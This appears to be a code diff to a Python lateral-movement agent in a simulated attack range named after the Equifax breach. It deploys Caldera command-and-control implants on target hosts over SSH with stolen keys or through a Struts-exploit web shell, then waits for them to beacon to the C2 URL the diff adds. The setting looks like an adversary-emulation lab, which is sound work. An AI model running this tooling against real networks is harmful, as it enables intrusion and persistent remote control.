@@ -17,10 +17,12 @@ class LateralMoveAgent(BaseAgent):
     Needs the CncService (the C&C server) in addition to the env state service.
     """
 
-    def __init__(self, env_service, cnc, docker_extnet: str = "equifax-seg_extnet"):
+    def __init__(self, env_service, cnc, docker_extnet: str = "equifax-seg_extnet",
+                 caldera_direct_url: str = "http://host.docker.internal:8888"):
         super().__init__(env_service)
         self.cnc = cnc
         self.docker_extnet = docker_extnet
+        self.caldera_direct_url = caldera_direct_url
 
     def run(
         self,
@@ -44,7 +46,7 @@ class LateralMoveAgent(BaseAgent):
                     # For the DB (intnet, no egress) run redeploy_relay.sh first so the
                     # agent is already beaconing and the block above returns a paw.
                     deploy_cmd = self.cnc.agent_deploy_command(
-                        group, **({"server_url": caldera_server_url} if caldera_server_url else {})
+                        group, server_url=caldera_server_url or self.caldera_direct_url
                     )
                     ssh_cmd = (
                         f"ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa "
@@ -58,12 +60,12 @@ class LateralMoveAgent(BaseAgent):
                         user=credential.username,
                         private_key=credential.ssh_key,
                     )
-                    access.run(self.cnc.agent_deploy_command(group))
+                    access.run(self.cnc.agent_deploy_command(group, server_url=self.caldera_direct_url))
                     method = f"ssh as {credential.username}"
             else:
                 access = WebShell(rhost=target_host, docker_network=self.docker_extnet)
                 method = "struts exploit"
-                access.run(self.cnc.agent_deploy_command(group))
+                access.run(self.cnc.agent_deploy_command(group, server_url=self.caldera_direct_url))
 
             # 3. Wait for it to beacon back to Caldera.
             paw = self.cnc.wait_for_agent(group)
